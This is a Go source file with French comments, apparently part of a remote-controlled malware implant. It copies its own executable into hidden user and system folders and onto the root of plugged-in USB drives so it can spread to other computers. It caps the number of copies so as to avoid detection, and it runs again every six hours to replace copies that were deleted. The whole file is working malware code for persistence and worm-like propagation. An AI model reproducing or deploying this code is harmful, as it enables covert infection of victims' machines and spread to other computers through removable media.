// spread.go — duplication du binaire sur le poste.
//
// Objectif : survivre à la suppression d'une copie. L'exécutable se recopie
// dans des dossiers que l'utilisateur ne parcourt pas (ProgramData, AppData,
// Temp, dossiers cachés à la racine des disques), et sur les clés USB
// branchées. Ce ne sont pas des lanceurs : la persistance reste assurée par la
// clé Run et le raccourci du dossier Démarrage, qui pointent vers le miroir.
//
// Le nombre de copies est plafonné : une prolifération incontrôlée remplit le
// disque et se remarque immédiatement.
package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unsafe"
)

const maxCopies = 8

// driveList rend les lettres de lecteurs présents, avec leur type.
func driveList() (fixed, removable []string) {
	mask, _, _ := kernel32DLL.NewProc("GetLogicalDrives").Call()
	for i := 0; i < 26; i++ {
		if mask&(1<<uint(i)) == 0 {
			continue
		}
		root := string(rune('A'+i)) + ":\\"
		t, _, _ := kernel32DLL.NewProc("GetDriveTypeW").Call(
			uintptr(unsafe.Pointer(str16(root))))
		switch int(t) {
		case 3: // DRIVE_FIXED
			fixed = append(fixed, root)
		case 2: // DRIVE_REMOVABLE
			removable = append(removable, root)
		}
	}
	return fixed, removable
}

// copyTo écrit le binaire à dst si absent ou différent, et le cache.
func copyTo(src, dst string, data []byte) bool {
	if st, err := os.Stat(dst); err == nil && st.Size() == int64(len(data)) {
		return false
	}
	if err := os.MkdirAll(filepath.Dir(dst), 0700); err != nil {
		return false
	}
	if err := os.WriteFile(dst, data, 0755); err != nil {
		return false
	}
	hideFile(dst)
	return true
}

// spreadCopies duplique l'exécutable aux emplacements prévus. `verbose`
// journalise chaque copie (commande !spread) ; au démarrage, l'opération est
// silencieuse.
func spreadCopies(verbose bool) string {
	exe := currentExe()
	if exe == "" {
		return "chemin de l'exécutable introuvable."
	}
	data, err := os.ReadFile(exe)
	if err != nil {
		return "lecture impossible : " + err.Error()
	}
	if len(data) == 0 {
		return "exécutable vide."
	}

	home := os.Getenv("USERPROFILE")
	appdata := os.Getenv("APPDATA")
	local := appDataLocal()
	public := os.Getenv("PUBLIC")
	name := mirrorFileName
	folder := workDirName

	var targets []string
	if os.Getenv("ProgramData") != "" {
		targets = append(targets, filepath.Join(os.Getenv("ProgramData"), folder, name))
	}
	if appdata != "" {
		targets = append(targets, filepath.Join(appdata, folder, name))
	}
	if public != "" {
		targets = append(targets, filepath.Join(public, "Documents", folder, name))
	}
	if home != "" {
		targets = append(targets, filepath.Join(home, "Documents", folder, name))
		targets = append(targets, filepath.Join(home, "AppData", "Local", "Temp", folder, name))
	}
	if local != "" {
		targets = append(targets, filepath.Join(local, folder, name))
	}

	fixed, removable := driveList()
	for _, d := range fixed {
		// Lettre système exclue : on ne duplique pas sur le disque Windows.
		if strings.EqualFold(strings.TrimSuffix(d, `\`), os.Getenv("SystemDrive")) {
			continue
		}
		targets = append(targets, filepath.Join(d, folder, name))
	}
	// Clés USB : copie à la racine, visible, pour repartir sur une autre
	// machine si quelqu'un branche la clé ailleurs.
	for _, d := range removable {
		targets = append(targets, filepath.Join(d, name))
	}

	done, failed := 0, 0
	var lines []string
	for _, t := range targets {
		if done >= maxCopies {
			break
		}
		if strings.EqualFold(t, exe) {
			continue
		}
		if copyTo(exe, t, data) {
			done++
			lines = append(lines, "copie : "+t)
		}
	}
	if done == 0 && len(lines) == 0 {
		// Aucune nouvelle copie : on vérifie au moins que les cibles existent.
		for _, t := range targets {
			if _, err := os.Stat(t); err != nil {
				failed++
			}
		}
	}
	if verbose {
		if len(lines) == 0 {
			return fmt.Sprintf("aucune nouvelle copie (%d cible(s) examinée(s), %d inaccessible(s)).",
				len(targets), failed)
		}
		return fmt.Sprintf("%d copie(s) posée(s) :\n```\n%s\n```", done, strings.Join(lines, "\n"))
	}
	plog(fmt.Sprintf("duplication: %d copie(s)", done))
	return ""
}

// spreadLoop refait une passe toutes les 6 heures : une clé USB branchée plus
// tard reçoit sa copie, un dossier nettoyé est regarni.
func spreadLoop() {
	for {
		time.Sleep(6 * time.Hour)
		if stopped.Load() {
			return
		}
		spreadCopies(false)
	}
}
